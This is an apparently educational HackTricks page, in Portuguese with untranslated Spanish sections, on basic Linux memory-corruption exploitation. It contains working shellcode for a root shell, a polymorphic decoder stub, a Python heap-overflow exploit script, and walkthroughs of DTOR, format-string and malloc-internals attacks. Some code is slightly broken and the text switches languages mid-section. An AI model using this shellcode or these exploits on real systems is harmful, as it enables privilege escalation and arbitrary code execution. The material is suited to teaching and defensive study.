# Explora√ß√£o no Linux (B√°sico)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## **2.SHELLCODE**

Ver interrup√ß√µes de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento para passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> Gera um execut√°vel com o c√≥digo assembly e podemos extrair os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nosso shellcode e extrair os OpCodes

**Verificar se o shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas de sistema est√£o sendo feitas corretamente, compile o programa anterior e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Ao criar shellcodes, um truque pode ser realizado. A primeira instru√ß√£o √© um salto para uma chamada. A chamada chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o de chamada, inserimos a string necess√°ria, para que com esse EIP possamos apontar para a string e continuar executando o c√≥digo.

EX **TRUQUE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Ca√ßador de Ovos:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode ali armazenada (procura por alguma assinatura na shellcode). √ötil nos casos em que h√° pouco espa√ßo dispon√≠vel para injetar c√≥digo.

**Shellcodes Polim√≥rficos**

S√£o shells cifrados que possuem um pequeno c√≥digo que os descriptografa e salta para ele, usando o truque de Call-Pop, este seria um **exemplo de cifra de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o √© poss√≠vel inserir um endere√ßo de stack no EIP (verifica-se que o EIP n√£o cont√©m 0xbf) ou quando n√£o √© poss√≠vel calcular a localiza√ß√£o da shellcode. No entanto, a fun√ß√£o vulner√°vel aceita um par√¢metro (onde a shellcode ser√° colocada).

Dessa forma, ao alterar o EIP por um endere√ßo de **ret**, a pr√≥xima instru√ß√£o ser√° carregada (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, a shellcode ser√° carregada.

O exploit seria: SHELLCODE + Preenchimento (at√© o EIP) + **\&ret** (os pr√≥ximos bytes da pilha apontam para o in√≠cio da shellcode, pois o endere√ßo do argumento passado √© colocado na pilha)

Parece que fun√ß√µes como **strncpy**, uma vez completas, removem da pilha o endere√ßo onde a shellcode estava armazenada, impossibilitando essa t√©cnica. Ou seja, o endere√ßo passado para a fun√ß√£o como argumento (que armazena a shellcode) √© modificado por um 0x00, ent√£o ao chamar o segundo **ret**, encontra-se com um 0x00 e o programa trava.

**T√©cnica de Murat**

No Linux, todos os programas s√£o mapeados come√ßando em 0xbfffffff.

Observando como a pilha de um novo processo √© constru√≠da no Linux, √© poss√≠vel desenvolver um exploit de modo que o programa seja iniciado em um ambiente onde a √∫nica vari√°vel seja a shellcode. O endere√ßo dela pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME\_do\_execut√°vel\_completo) - strlen(shellcode)

Dessa forma, √© poss√≠vel obter facilmente o endere√ßo onde est√° a vari√°vel de ambiente com a shellcode.

Isso √© poss√≠vel gra√ßas √† fun√ß√£o execle, que permite criar um ambiente com apenas as vari√°veis de ambiente desejadas.

**Jump to ESP: Estilo Windows**

Como o ESP est√° sempre apontando para o in√≠cio da pilha, essa t√©cnica consiste em substituir o EIP pelo endere√ßo de uma chamada para **jmp esp** ou **call esp**. Assim, a shellcode √© armazenada ap√≥s a sobrescrita do EIP, pois ap√≥s executar o **ret**, o ESP estar√° apontando para o pr√≥ximo endere√ßo, exatamente onde a shellcode foi armazenada.

Caso o ASLR n√£o esteja ativo no Windows ou Linux, √© poss√≠vel chamar **jmp esp** ou **call esp** armazenados em algum objeto compartilhado. Se o ASLR estiver ativo, pode-se procurar dentro do pr√≥prio programa vulner√°vel.

Al√©m disso, o fato de poder colocar a shellcode ap√≥s a corrup√ß√£o do EIP em vez de no meio da pilha permite que as instru√ß√µes push ou pop executadas no meio da fun√ß√£o n√£o afetem a shellcode (o que poderia ocorrer se estivesse no meio da pilha da fun√ß√£o).

De forma muito semelhante a isso, se soubermos que uma fun√ß√£o retorna o endere√ßo onde a shellcode est√° armazenada, √© poss√≠vel chamar **call eax** ou **jmp eax (ret2eax).**

**Estouro de inteiros**

Esse tipo de estouro ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o que √© passado, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En exemplo anterior, vemos que o programa espera 2 par√¢metros. O primeiro √© o comprimento da pr√≥xima string e o segundo √© a string.

Se passarmos um n√∫mero negativo como primeiro par√¢metro, ser√° exibido que len < 256 e passaremos por esse filtro, e tamb√©m strlen(buffer) ser√° menor que l, pois l √© um unsigned int e ser√° muito grande.

Esse tipo de overflow n√£o busca escrever algo no processo do programa, mas sim contornar filtros mal projetados para explorar outras vulnerabilidades.

**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir e pode ser interessante observar isso. Pode ser que ela assuma o valor que uma vari√°vel da fun√ß√£o anterior assumia e que essa vari√°vel seja controlada pelo atacante.

##

###

###

###

### **.fini\_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes do programa terminar. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar ao main novamente para **explorar a string de formato uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Note que isso **n√£o** criar√° um **loop eterno** porque quando voc√™ voltar para o principal, o can√°rio perceber√°, o final da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Portanto, com isso voc√™ poder√° **ter mais 1 execu√ß√£o** da vulnerabilidade.

### **Formatar Strings para Extrair Conte√∫do**

Uma string de formata√ß√£o tamb√©m pode ser abusada para **extrair conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o h√° uma **vari√°vel local na pilha apontando para uma flag**. Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer o **printf acessar** esse **endere√ßo** e **imprimir** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E a partir do vazamento voc√™ pode ver que o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Portanto, **acessando** o **8¬∫ par√¢metro** voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Note que seguindo o **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para o **`printf`** na se√ß√£o onde o **execut√°vel** est√° **carregado** e **extrair** ele **inteiramente**!

### **DTOR**

{% hint style="danger" %}
Atualmente √© muito **incomum encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes do programa terminar.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalmente voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Portanto, se voc√™ apenas ver esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Portanto, **sobrescreva** o **`00000000`** com o **endere√ßo** do **shellcode** para execut√°-lo.

### **Strings de Formato para Estouros de Buffer**

O **sprintf** move uma string formatada para uma **vari√°vel**. Portanto, voc√™ poderia abusar da **formata√ß√£o** de uma string para causar um **estouro de buffer na vari√°vel** para onde o conte√∫do √© copiado.\
Por exemplo, a carga `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o para a qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ puder **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ **obter√° controle** sobre o **processo**, mas atualmente isso √© mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** por v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente esse vetor de ataque n√£o √© muito √∫til, pelo menos em x86 e x64\_86.\
A fun√ß√£o de **criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque **retornam o mesmo** que receberam como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o as **arquiteturas vulner√°veis a esse ataque s√£o as mesmas acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou voc√™ tamb√©m poderia modificar EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© um array de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para o array de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se uma **sobrescrita** do **VPtr** for alcan√ßada, poderia ser **modificado** para **apontar** para um m√©todo fict√≠cio para que a execu√ß√£o de uma fun√ß√£o v√° para o shellcode.

## **Medidas Preventivas e Evas√µes**

###

**Substitui√ß√£o do Libsafe**

Ativado por: LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Ele intercepta chamadas para algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o para compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD\_PRELOAD n√£o funciona em bin√°rios com suid).

**Espa√ßo de Endere√ßo ASCII Armored**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que a fun√ß√£o strcpy@plt (da plt) seja chamada e aponte para a entrada da GOT e copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, o mesmo √© feito apontando para GOT+1 e copiando o 2¬∫ byte de system()... Por fim, a chamada √© feita para o endere√ßo armazenado na GOT que ser√° system()

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico em um subdiret√≥rio espec√≠fico

Um administrador pode sair dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de C√≥digo**

Valgrind ‚Äî> Procura por erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Estouros de Heap: Exploits B√°sicos**

**Chunk Alocado**

prev\_size |\
size | ‚ÄîCabe√ßalho\
\*mem | Dados

**Chunk Livre**

prev\_size |\
size |\
\*fd | Ptr chunk seguinte\
\*bk | Ptr chunk anterior ‚ÄîCabe√ßalho\
\*mem | Dados

Os chunks livres est√£o em uma lista duplamente encadeada (bin) e nunca podem haver dois chunks livres juntos (eles s√£o unidos)

No ‚Äúsize‚Äù h√° bits para indicar: Se o chunk anterior est√° em uso, se o chunk foi alocado por meio de mmap() e se o chunk pertence √† arena prim√°ria.

Ao liberar um chunk, se algum dos chunks cont√≠guos estiver livre, eles s√£o fundidos pela macro unlink() e o novo chunk maior √© passado para frontlink() para que seja inserido no bin apropriado.

unlink(){\
BK = P->bk; ‚Äî> O BK do novo chunk √© o que o chunk que j√° estava livre antes tinha\
FD = P->fd; ‚Äî> O FD do novo chunk √© o que o chunk que j√° estava livre antes tinha\
FD->bk = BK; ‚Äî> O BK do chunk seguinte aponta para o novo chunk\
BK->fd = FD; ‚Äî> O FD do chunk anterior aponta para o novo chunk\
}

Portanto, se conseguirmos modificar o P->bk com o endere√ßo de um shellcode e o P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, √© poss√≠vel:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim, o shellcode √© executado ao sair do programa.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e o shellcode precisa ser ajustado para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso resulta na escrita de 4 bytes a partir do 8¬∫ byte do shellcode, ent√£o a primeira instru√ß√£o do shellcode deve ser um jmp para pular isso e chegar a uns nops que levem ao restante do shellcode.

Portanto, o exploit √© criado:

No buffer1, insira o shellcode come√ßando com um jmp para que ele caia nos nops ou no restante do shellcode.

Ap√≥s o shellcode, insira preenchimento at√© chegar ao campo prev\_size e size do pr√≥ximo chunk. Nestes locais, insira 0xfffffff0 (para sobrescrever o prev\_size para que tenha o bit que indica que est√° livre) e ‚Äú-4‚Äù (0xfffffffc) no size (para que, ao verificar no 3¬∫ chunk se o 2¬∫ estava livre, na realidade v√° para o prev\_size modificado que dir√° que est√° livre) -> Assim, quando o free() investigar, ele ir√° para o size do 3¬∫, mas na realidade ir√° para o 2¬∫ - 4 e pensar√° que o 2¬∫ chunk est√° livre. E ent√£o chamar√° **unlink()**.

Ao chamar unlink(), ele usar√° os primeiros dados do 2¬∫ chunk como P->fd, ent√£o o endere√ßo que se deseja sobrescrever - 12 (pois em FD->bk ele adicionar√° 12 ao endere√ßo armazenado em FD) ser√° inserido l√°. E nesse endere√ßo, insira o segundo endere√ßo encontrado no 2¬∫ chunk, que deve ser o endere√ßo do shellcode (P->bk falso).

**from struct import \***

**import os**
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]

En el segundo trozo y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuaci√≥n en el trozo 2 ponemos un mont√≥n de nops y finalmente la shellcode

De esta forma se llamar√° a \_int\_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del TROZO2 el cual saltar√° a la shellcode.
Para aplicar esta t√©cnica, √© necess√°rio atender a alguns requisitos adicionais que complicam um pouco mais o payload.

Esta t√©cnica n√£o √© mais aplic√°vel, pois foi aplicado quase o mesmo patch que para unlink. Verifica-se se o novo local para onde se aponta tamb√©m est√° apontando para ele.

**Fastbin**

√â uma variante de The house of mind

Interessa-nos executar o seguinte c√≥digo ap√≥s a primeira verifica√ß√£o da fun√ß√£o \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Sendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Desta forma, se for colocado em "fb", ele aponta para uma fun√ß√£o na GOT, onde ser√° colocada a dire√ß√£o do chunk sobrescrito. Para isso, √© necess√°rio que a arena esteja pr√≥xima das dire√ß√µes de dtors. Mais precisamente, av->max\_fast deve estar na dire√ß√£o que ser√° sobrescrita.

Dado que com The House of Mind vimos que control√°vamos a posi√ß√£o do av.

Ent√£o, se no campo size for inserido um tamanho de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() retornar√° fastbins\[-1\], que apontar√° para av->max\_fast

Neste caso, av->max\_fast ser√° a dire√ß√£o que ser√° sobrescrita (n√£o para onde aponta, mas essa posi√ß√£o ser√° sobrescrita).

Al√©m disso, √© necess√°rio que o chunk adjacente ao liberado seja maior que 8 -> Como mencionamos que o tamanho do chunk liberado √© 8, neste chunk falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no chunk liberado, ent√£o no in√≠cio teremos que colocar um jmp que caia em nops).

Al√©m disso, esse mesmo chunk falso deve ser menor que av->system\_mem. av->system\_mem est√° 1848 bytes adiante.

Devido aos nulos de \_DTOR\_END\_ e √†s poucas dire√ß√µes na GOT, nenhum desses endere√ßos dessas se√ß√µes serve para serem sobrescritos, ent√£o vejamos como aplicar fastbin para atacar a pilha.

Outra forma de ataque √© redirecionar o **av** para a pilha.

Se modificarmos o size para ser 16 em vez de 8, ent√£o: fastbin\_index() retornar√° fastbins\[0\] e podemos usar isso para sobrescrever a pilha.

Para isso, n√£o deve haver nenhum canary ou valores estranhos na pilha, na verdade, devemos encontrar o seguinte: 4 bytes nulos + EBP + RET

Os 4 bytes nulos s√£o necess√°rios para que o **av** esteja nessa dire√ß√£o e o primeiro elemento de um **av** √© o mutex que deve ser igual a 0.

O **av->max\_fast** ser√° o EBP e ser√° um valor que nos permitir√° ignorar as restri√ß√µes.

No **av->fastbins\[0\]** ser√° sobrescrito com o endere√ßo de **p** e ser√° o RET, assim a shellcode ser√° executada.

Al√©m disso, em **av->system\_mem** (1484 bytes acima da posi√ß√£o na pilha) haver√° bastante lixo que nos permitir√° ignorar a verifica√ß√£o que √© realizada.

Al√©m disso, √© necess√°rio que o chunk adjacente ao liberado seja maior que 8 -> Como mencionamos que o tamanho do chunk liberado √© 16, neste chunk falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no chunk liberado, ent√£o no in√≠cio teremos que colocar um jmp que caia em nops que v√™m ap√≥s o campo size do novo chunk falso).

**The House of Spirit**

Neste caso, buscamos ter um ponteiro para um malloc que possa ser alterado pelo atacante (por exemplo, o ponteiro est√° na pilha abaixo de um poss√≠vel overflow para uma vari√°vel).

Assim, poder√≠amos fazer com que esse ponteiro apontasse para onde quer que fosse. No entanto, nem todo local √© v√°lido, o tamanho do chunk falso deve ser menor que av->max\_fast e mais especificamente igual ao tamanho solicitado em uma chamada futura para malloc()+8. Portanto, se soubermos que ap√≥s esse ponteiro vulner√°vel √© feita uma chamada para malloc(40), o tamanho do chunk falso deve ser igual a 48.

